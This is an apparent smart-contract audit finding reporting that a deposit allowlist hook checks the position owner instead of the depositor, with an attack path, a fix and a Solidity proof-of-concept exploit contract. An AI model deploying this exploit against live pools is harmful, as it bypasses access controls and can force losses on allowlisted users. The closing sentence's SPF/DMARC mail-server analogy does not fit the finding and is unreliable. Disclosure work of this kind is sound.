### Title
`DepositAllowlistExtension` checks `owner` instead of `sender`, allowing any unauthorized caller to bypass the deposit allowlist — (File: metric-periphery/contracts/extensions/DepositAllowlistExtension.sol)

---

### Summary

The `DepositAllowlistExtension.beforeAddLiquidity` hook silently ignores the `sender` argument (the actual depositor who provides tokens) and gates only on `owner` (the position recipient). Because `MetricOmmPool.addLiquidity` lets `msg.sender` and `owner` be independent addresses, any unprivileged caller can bypass the allowlist by naming an already-allowlisted address as `owner`.

---

### Finding Description

`MetricOmmPool.addLiquidity` passes `msg.sender` as `sender` and the caller-supplied `owner` as the position owner to the extension hook: [1](#0-0) 

`DepositAllowlistExtension.beforeAddLiquidity` drops the first parameter (unnamed, i.e. `sender`) and checks only `owner`: [2](#0-1) 

The extension's own NatSpec and setter name both declare the intent is to gate by **depositor** (the actual token provider): [3](#0-2) 

By contrast, `removeLiquidity` enforces `msg.sender == owner` before calling the hook, so `sender` and `owner` are always identical there — the bypass surface exists only in `addLiquidity`: [4](#0-3) 

**Attack path:**

1. Pool admin deploys a pool with `DepositAllowlistExtension`; only Alice (`0xAlice`) is allowlisted.
2. Bob (`0xBob`, not allowlisted) calls `pool.addLiquidity(owner=0xAlice, salt=0, deltas=..., callbackData=..., extensionData=...)`.
3. The pool calls `DepositAllowlistExtension.beforeAddLiquidity(sender=0xBob, owner=0xAlice, ...)`.
4. The hook evaluates `allowedDepositor[pool][0xAlice]` → `true`; the check passes.
5. Bob's callback (`metricOmmSwapCallback`) transfers Bob's tokens into the pool.
6. Alice receives the LP shares she never requested; Bob has deposited into a restricted pool without authorization.

---

### Impact Explanation

The deposit allowlist — the only on-chain mechanism restricting who may supply liquidity — is rendered ineffective. Any unprivileged address can add liquidity to a pool that the admin intended to be private or KYC-gated. Additionally, the allowlisted `owner` (Alice) receives an involuntary position: if the pool is in an adverse price state at the time of the forced deposit, Alice's unintended exposure causes direct loss of her LP value when she eventually withdraws.

---

### Likelihood Explanation

The bypass requires no special role, no flash loan, and no complex setup. Any EOA or contract can call `addLiquidity` with an allowlisted address as `owner`. The allowlisted addresses are publicly readable from `allowedDepositor` mapping events or direct storage reads.

---

### Recommendation

Name and check `sender` (the actual depositor) instead of `owner` in `beforeAddLiquidity`:

```solidity
// DepositAllowlistExtension.sol
function beforeAddLiquidity(address sender, address /*owner*/, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
```

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Assume pool has DepositAllowlistExtension configured; only `alice` is allowlisted.
// Bob is NOT allowlisted.

contract BobBypassDeposit {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;
    address alice;

    function exploit(LiquidityDelta calldata deltas) external {
        // Bob calls addLiquidity with owner = alice (allowlisted)
        // The DepositAllowlistExtension checks allowedDepositor[pool][alice] == true → passes
        // Bob's tokens are pulled in the callback; alice gets the shares
        pool.addLiquidity(
            alice,          // owner — passes the allowlist check
            0,              // salt
            deltas,
            abi.encode(address(this)),  // callbackData
            ""
        );
    }

    // Pool calls this to pull tokens from Bob
    function metricOmmSwapCallback(int128 amount0Delta, int128 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) token0.transfer(address(pool), uint256(int256(amount0Delta)));
        if (amount1Delta > 0) token1.transfer(address(pool), uint256(int256(amount1Delta)));
    }
}
```

Bob successfully deposits into the restricted pool. The `DepositAllowlistExtension` guard — the configured SPF/DMARC analog — passes because it validates the position recipient (`owner`) rather than the actual token sender (`sender`), exactly mirroring the mail-server misconfiguration where the envelope-sender identity was never verified.
